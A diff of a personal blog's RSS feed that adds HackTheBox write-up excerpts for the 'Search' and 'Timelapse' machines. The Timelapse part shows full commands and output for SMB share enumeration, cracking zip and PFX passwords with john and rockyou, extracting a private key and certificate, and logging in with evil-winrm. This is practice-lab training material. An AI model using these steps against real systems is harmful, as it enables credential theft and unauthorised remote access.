@@ -1,1 +1,335 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Pfx2john on Personal Blog</title><link>https://0x13hrafnulf.github.io/tags/pfx2john/</link><description>Recent content in Pfx2john on Personal Blog</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Fri, 01 Sep 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://0x13hrafnulf.github.io/tags/pfx2john/index.xml" rel="self" type="application/rss+xml"/><item><title>[HTB] Machine: Search</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/search/</link><pubDate>Fri, 01 Sep 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/search/</guid><description>Search Enumeration nmap └─$ nmap -Pn -p- 10.10.11.129 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-23 21:42 BST Warning: 10.10.11.129 giving up on port because retransmission cap hit (6). Nmap scan report for 10.10.11.129 (10.10.11.129) Host is up (0.10s latency). Not shown: 65514 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 443/tcp open https 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 8172/tcp open unknown 9389/tcp open adws 49667/tcp open unknown 49675/tcp open unknown 49676/tcp open unknown 49702/tcp open unknown 49712/tcp open unknown 49733/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 1222.</description></item><item><title>[HTB] Machine: Timelapse</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/timelapse/</link><pubDate>Fri, 18 Aug 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/timelapse/</guid><description>Timelapse Enumeration nmap └─$ nmap -p- -Pn 10.10.11.152 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-24 17:00 BST Nmap scan report for 10.10.11.152 (10.10.11.152) Host is up (0.094s latency). Not shown: 65517 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5986/tcp open wsmans 9389/tcp open adws 49667/tcp open unknown 49673/tcp open unknown 49674/tcp open unknown 49696/tcp open unknown 56502/tcp open unknown └─$ nmap -sV -sC -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,46793,49674,49696,56502 -Pn 10.</description></item></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Pfx2john on Personal Blog</title><link>https://0x13hrafnulf.github.io/tags/pfx2john/</link><description>Recent content in Pfx2john on Personal Blog</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Fri, 01 Sep 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://0x13hrafnulf.github.io/tags/pfx2john/index.xml" rel="self" type="application/rss+xml"/><item><title>[HTB] Machine: Search</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/search/</link><pubDate>Fri, 01 Sep 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/search/</guid><description>&lt;h1 id="search">Search&lt;/h1>
+&lt;h2 id="enumeration">Enumeration&lt;/h2>
+&lt;ul>
+&lt;li>&lt;code>nmap&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p- 10.10.11.129 -T4
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-23 21:42 BST
+Warning: 10.10.11.129 giving up on port because retransmission cap hit (6).
+Nmap scan report for 10.10.11.129 (10.10.11.129)
+Host is up (0.10s latency).
+Not shown: 65514 filtered tcp ports (no-response)
+PORT STATE SERVICE
+53/tcp open domain
+80/tcp open http
+88/tcp open kerberos-sec
+135/tcp open msrpc
+139/tcp open netbios-ssn
+389/tcp open ldap
+443/tcp open https
+445/tcp open microsoft-ds
+464/tcp open kpasswd5
+593/tcp open http-rpc-epmap
+636/tcp open ldapssl
+3268/tcp open globalcatLDAP
+3269/tcp open globalcatLDAPssl
+8172/tcp open unknown
+9389/tcp open adws
+49667/tcp open unknown
+49675/tcp open unknown
+49676/tcp open unknown
+49702/tcp open unknown
+49712/tcp open unknown
+49733/tcp open unknown
+Nmap done: 1 IP address (1 host up) scanned in 1222.26 seconds
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p53,80,88,135,139,389,443,445,464,593,636,3268,3269,8172,9389 -sC -sV 10.10.11.129 -T4
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-23 22:12 BST
+Nmap scan report for 10.10.11.129 (10.10.11.129)
+Host is up (0.18s latency).
+PORT STATE SERVICE VERSION
+53/tcp open domain Simple DNS Plus
+80/tcp open http Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Search &amp;amp;mdash; Just Testing IIS
+| http-methods:
+|_ Potentially risky methods: TRACE
+88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-09-23 21:12:07Z)
+135/tcp open msrpc Microsoft Windows RPC
+139/tcp open netbios-ssn Microsoft Windows netbios-ssn
+389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=research
+| Not valid before: 2020-08-11T08:13:35
+|_Not valid after: 2030-08-09T08:13:35
+|_ssl-date: 2023-09-23T21:13:36+00:00; -41s from scanner time.
+443/tcp open ssl/http Microsoft IIS httpd 10.0
+|_ssl-date: 2023-09-23T21:13:36+00:00; -41s from scanner time.
+| tls-alpn:
+|_ http/1.1
+| http-methods:
+|_ Potentially risky methods: TRACE
+| ssl-cert: Subject: commonName=research
+| Not valid before: 2020-08-11T08:13:35
+|_Not valid after: 2030-08-09T08:13:35
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Search &amp;amp;mdash; Just Testing IIS
+445/tcp open microsoft-ds?
+464/tcp open kpasswd5?
+593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
+636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2023-09-23T21:13:36+00:00; -41s from scanner time.
+| ssl-cert: Subject: commonName=research
+| Not valid before: 2020-08-11T08:13:35
+|_Not valid after: 2030-08-09T08:13:35
+3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2023-09-23T21:13:36+00:00; -41s from scanner time.
+| ssl-cert: Subject: commonName=research
+| Not valid before: 2020-08-11T08:13:35
+|_Not valid after: 2030-08-09T08:13:35
+3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2023-09-23T21:13:36+00:00; -41s from scanner time.
+| ssl-cert: Subject: commonName=research
+| Not valid before: 2020-08-11T08:13:35
+|_Not valid after: 2030-08-09T08:13:35
+8172/tcp open ssl/http Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| ssl-cert: Subject: commonName=WMSvc-SHA2-RESEARCH
+| Not valid before: 2020-04-07T09:05:25
+|_Not valid after: 2030-04-05T09:05:25
+|_http-title: Site doesn&amp;#39;t have a title.
+|_ssl-date: 2023-09-23T21:13:36+00:00; -41s from scanner time.
+| tls-alpn:
+|_ http/1.1
+9389/tcp open mc-nmf .NET Message Framing
+Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows
+Host script results:
+|_clock-skew: mean: -40s, deviation: 0s, median: -41s
+| smb2-time:
+| date: 2023-09-23T21:13:05
+|_ start_date: N/A
+| smb2-security-mode:
+| 3:1:1:
+|_ Message signing enabled and required
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 99.21 seconds
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>&lt;code>smb&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ smbclient -N -L //search.htb
+Anonymous login successful
+Sharename Type Comment
+--------- ---- -------
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to search.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>Web Server
+&lt;ul>
+&lt;li>Ports &lt;code>80&lt;/code>, &lt;code>443&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/search/images/1.png">&lt;/p></description></item><item><title>[HTB] Machine: Timelapse</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/timelapse/</link><pubDate>Fri, 18 Aug 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/timelapse/</guid><description>&lt;h1 id="timelapse">Timelapse&lt;/h1>
+&lt;h2 id="enumeration">Enumeration&lt;/h2>
+&lt;ul>
+&lt;li>&lt;code>nmap&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ nmap -p- -Pn 10.10.11.152 -T4
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-24 17:00 BST
+Nmap scan report for 10.10.11.152 (10.10.11.152)
+Host is up (0.094s latency).
+Not shown: 65517 filtered tcp ports (no-response)
+PORT STATE SERVICE
+53/tcp open domain
+88/tcp open kerberos-sec
+135/tcp open msrpc
+139/tcp open netbios-ssn
+389/tcp open ldap
+445/tcp open microsoft-ds
+464/tcp open kpasswd5
+593/tcp open http-rpc-epmap
+636/tcp open ldapssl
+3268/tcp open globalcatLDAP
+3269/tcp open globalcatLDAPssl
+5986/tcp open wsmans
+9389/tcp open adws
+49667/tcp open unknown
+49673/tcp open unknown
+49674/tcp open unknown
+49696/tcp open unknown
+56502/tcp open unknown
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ nmap -sV -sC -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,46793,49674,49696,56502 -Pn 10.10.11.152 -T4
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-24 17:06 BST
+Nmap scan report for 10.10.11.152 (10.10.11.152)
+Host is up (0.17s latency).
+PORT STATE SERVICE VERSION
+53/tcp open domain Simple DNS Plus
+88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-08-25 00:05:47Z)
+135/tcp open msrpc Microsoft Windows RPC
+139/tcp open netbios-ssn Microsoft Windows netbios-ssn
+389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
+445/tcp open microsoft-ds?
+464/tcp open kpasswd5?
+593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
+636/tcp open ldapssl?
+3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
+3269/tcp open globalcatLDAPssl?
+5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+| ssl-cert: Subject: commonName=dc01.timelapse.htb
+| Not valid before: 2021-10-25T14:05:29
+|_Not valid after: 2022-10-25T14:25:29
+| tls-alpn:
+|_ http/1.1
+|_http-title: Not Found
+|_ssl-date: 2023-08-25T00:07:22+00:00; +7h59m24s from scanner time.
+9389/tcp open mc-nmf .NET Message Framing
+46793/tcp filtered unknown
+49667/tcp open msrpc Microsoft Windows RPC
+49674/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
+49696/tcp open msrpc Microsoft Windows RPC
+56502/tcp open msrpc Microsoft Windows RPC
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+Host script results:
+| smb2-security-mode:
+| 3:1:1:
+|_ Message signing enabled and required
+| smb2-time:
+| date: 2023-08-25T00:06:44
+|_ start_date: N/A
+|_clock-skew: mean: 7h59m23s, deviation: 0s, median: 7h59m22s
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>Add &lt;code>dc01.timelapse.htb&lt;/code> and &lt;code>timelapse.htb&lt;/code> to &lt;code>/etc/hosts&lt;/code>&lt;/li>
+&lt;li>&lt;code>crackmapexec&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ crackmapexec smb dc01.timelapse.htb --shares -u test -p &amp;#39;&amp;#39;
+SMB timelapse.htb 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
+SMB timelapse.htb 445 DC01 [+] timelapse.htb\test:
+SMB timelapse.htb 445 DC01 [+] Enumerated shares
+SMB timelapse.htb 445 DC01 Share Permissions Remark
+SMB timelapse.htb 445 DC01 ----- ----------- ------
+SMB timelapse.htb 445 DC01 ADMIN$ Remote Admin
+SMB timelapse.htb 445 DC01 C$ Default share
+SMB timelapse.htb 445 DC01 IPC$ READ Remote IPC
+SMB timelapse.htb 445 DC01 NETLOGON Logon server share
+SMB timelapse.htb 445 DC01 Shares READ
+SMB timelapse.htb 445 DC01 SYSVOL Logon server share
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>&lt;code>smbclient&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ smbclient -N //10.10.11.152/Shares
+Try &amp;#34;help&amp;#34; to get a list of possible commands.
+smb: \&amp;gt; ls
+. D 0 Mon Oct 25 16:39:15 2021
+.. D 0 Mon Oct 25 16:39:15 2021
+Dev D 0 Mon Oct 25 20:40:06 2021
+HelpDesk D 0 Mon Oct 25 16:48:42 2021
+6367231 blocks of size 4096. 1270621 blocks available
+smb: \&amp;gt; cd Dev
+smb: \Dev\&amp;gt; ls
+. D 0 Mon Oct 25 20:40:06 2021
+.. D 0 Mon Oct 25 20:40:06 2021
+winrm_backup.zip A 2611 Mon Oct 25 16:46:42 2021
+6367231 blocks of size 4096. 1270528 blocks available
+smb: \Dev\&amp;gt; get winrm_backup.zip
+getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (3.1 KiloBytes/sec) (average 3.1 KiloBytes/sec)
+smb: \Dev\&amp;gt; cd ..
+smb: \&amp;gt; ls
+. D 0 Mon Oct 25 16:39:15 2021
+.. D 0 Mon Oct 25 16:39:15 2021
+Dev D 0 Mon Oct 25 20:40:06 2021
+HelpDesk D 0 Mon Oct 25 16:48:42 2021
+cd Help
+6367231 blocks of size 4096. 1269473 blocks available
+smb: \&amp;gt; cd HelpDesk
+smb: \HelpDesk\&amp;gt; ls
+. D 0 Mon Oct 25 16:48:42 2021
+.. D 0 Mon Oct 25 16:48:42 2021
+LAPS.x64.msi A 1118208 Mon Oct 25 15:57:50 2021
+LAPS_Datasheet.docx A 104422 Mon Oct 25 15:57:46 2021
+LAPS_OperationsGuide.docx A 641378 Mon Oct 25 15:57:40 2021
+LAPS_TechnicalSpecification.docx A 72683 Mon Oct 25 15:57:44 2021
+6367231 blocks of size 4096. 1269439 blocks available
+smb: \HelpDesk\&amp;gt;
+&lt;/code>&lt;/pre>&lt;h2 id="foothold">Foothold&lt;/h2>
+&lt;ul>
+&lt;li>&lt;code>winrm_backup.zip&lt;/code> is protected with password&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ unzip winrm_backup.zip
+Archive: winrm_backup.zip
+[winrm_backup.zip] legacyy_dev_auth.pfx password:
+skipping: legacyy_dev_auth.pfx incorrect password
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>Let&amp;rsquo;s crack it
+&lt;ul>
+&lt;li>&lt;code>zip2john winrm_backup.zip &amp;gt; winrm.hash&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ john --wordlist=/usr/share/wordlists/rockyou.txt winrm.hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 2 OpenMP threads
+Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status
+supremelegacy (winrm_backup.zip/legacyy_dev_auth.pfx)
+1g 0:00:00:00 DONE (2023-08-24 17:22) 4.545g/s 15769Kp/s 15769Kc/s 15769KC/s surkerior..suppamas
+Use the &amp;#34;--show&amp;#34; option to display all of the cracked passwords reliably
+Session completed.
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>Unzip&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ unzip winrm_backup.zip
+Archive: winrm_backup.zip
+[winrm_backup.zip] legacyy_dev_auth.pfx password:
+inflating: legacyy_dev_auth.pfx
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>Okay, we can follow this &lt;a href="https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file" target="_blank" rel="noopener">post&lt;/a>
+&lt;ul>
+&lt;li>If we try it, it&amp;rsquo;s protected with password&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key
+Enter Import Password:
+Mac verify error: invalid password?
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>Let&amp;rsquo;s crack this one too
+&lt;ul>
+&lt;li>&lt;code>pfx2john legacyy_dev_auth.pfx &amp;gt; legacyy_dev_auth.hash&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ john --wordlist=/usr/share/wordlists/rockyou.txt legacyy_dev_auth.hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
+Cost 1 (iteration count) is 2000 for all loaded hashes
+Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
+Will run 2 OpenMP threads
+Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status
+thuglegacy (legacyy_dev_auth.pfx)
+1g 0:00:00:58 DONE (2023-08-24 17:28) 0.01705g/s 55112p/s 55112c/s 55112C/s thuglife06..thug211
+Use the &amp;#34;--show&amp;#34; option to display all of the cracked passwords reliably
+Session completed.
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>Let&amp;rsquo;s try extracting key again&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key
+Enter Import Password:
+Enter PEM pass phrase:
+Verifying - Enter PEM pass phrase:
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>Decrypt it&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ openssl rsa -in legacyy_dev_auth.key -out legacyy_dev_auth-decrypted.key
+Enter pass phrase for legacyy_dev_auth.key:
+writing RSA key
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>Extract certificate&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
+Enter Import Password:
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>Result&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ ls -lha legacyy_dev_auth*
+-rw------- 1 kali kali 1.3K Aug 24 17:33 legacyy_dev_auth.crt
+-rw------- 1 kali kali 1.7K Aug 24 17:33 legacyy_dev_auth-decrypted.key
+-rw-r--r-- 1 kali kali 5.0K Aug 24 17:27 legacyy_dev_auth.hash
+-rw------- 1 kali kali 2.1K Aug 24 17:29 legacyy_dev_auth.key
+-rwxr-xr-x 1 kali kali 2.5K Oct 25 2021 legacyy_dev_auth.pfx
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>Let&amp;rsquo;s connect using &lt;code>evil-winrm&lt;/code>
+&lt;ul>
+&lt;li>&lt;code>evil-winrm -S -k legacyy_dev_auth-decrypted.key -c legacyy_dev_auth.crt -i timelapse.htb&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/timelapse/images/1.png">&lt;/p></description></item></channel></rss>
